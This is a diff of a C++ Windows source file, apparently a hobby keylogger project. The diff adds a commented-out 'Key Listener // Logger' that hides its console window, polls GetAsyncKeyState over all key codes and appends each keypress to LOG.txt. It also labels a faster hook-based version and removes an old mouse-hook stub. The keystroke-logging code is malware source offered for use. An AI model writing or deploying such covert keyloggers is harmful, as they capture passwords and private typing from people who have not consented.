@@ -1,15 +1,99 @@
 
 
-    
+
+// --------------------------  Key Listener // Logger - Without Hook - Bad performance ------------------ 
+
+// #include <iostream>
+//#include <stdlib.h>
+//#include <windows.h>
+//
+//using namespace std;
+//
+//// ------------------------------------------------------------------------------------------
+//void HideConsole()
+//{
+//	// Handle to a window - part of win32 api
+//	HWND handle;
+//	AllocConsole();	 // Initializes standard input, standard output, and standard error handles for the new console
+//	handle = FindWindowA("ConsoleWindowClass", NULL);
+//	ShowWindow(handle, 0);
+//}
+//
+//
+//// ------------------------------------------------------------------------------------------
+//#pragma warning (disable : 4996)
+//int Save(int _key, const char* file)
+//{
+//	/*if ((_key == i) || (_key == 2))
+//	{
+//		return 0;
+//	}*/
+//
+//	cout << _key << endl;
+//
+//	FILE* outputFile;
+//	outputFile = fopen(file, "a+");
+//
+//
+//	// Special Keys
+//	switch (_key)
+//	{
+//      	//case 8: fprintf(outputFile, "[BACKSPACE]"); break;
+//		default: fprintf(outputFile, "%s", &_key);
+//	}
+//	
+//	fclose(outputFile);
+//
+//	return 0;
+//}
+//// ------------------------------------------------------------------------------------------
+//
+//
+//int main()
+//{
+//	//HideConsole();
+//	char i;
+//
+//	while (true)
+//	{
+//		for (i=8; i <= 255; i++)
+//		{
+//			if (GetAsyncKeyState(i) == -32767) 	// -32767 means the button is pressed    // Constantly looping all the keys and if the key is pressed the value is -32767 
+//			{
+//				Save(i,"LOG.txt");
+//			}
+//		}
+//	}
+//
+//
+//	cin.get();
+//	return 0;
+//}
+//// ------------------------------------------------------------------------------------------
+//
 
 
 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+// ---------------------------- Key Listener / Logger -- with hook -- Better Performance ---------------------
 
 
 
 // --------------------------------------------------------------------------------------------------------------
-
-
 
 #define _WIN32_WINNT 0x0500
 #include<Windows.h>
@@ -143,45 +227,3 @@ int main()
 }
 
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-// -------------------------------------------------------------------------------------
-//
-//#include<Windows.h>
-//#include <stdio.h>
-//
-//
-//HHOOK hHock = NULL;
-//
-//LRESULT CALLBACK MyLowLevelHook(int nCode, WPARAM wParam, LPARAM lParam)
-//{
-//    printf("_a_");
-//    return CallNextHookEx(hHock, nCode, wParam, lParam);
-//}
-//
-//int main()
-//{
-//    MSG msg;
-//    hHock = SetWindowsHookEx(WH_MOUSE_LL, MyLowLevelHook, NULL, NULL);
-//
-//    while (!GetMessage(&msg, NULL, NULL, NULL)) {
-//        TranslateMessage(&msg);
-//        DispatchMessage(&msg);
-//    }
-//
-//    UnhookWindowsHookEx(hHock);
-//}
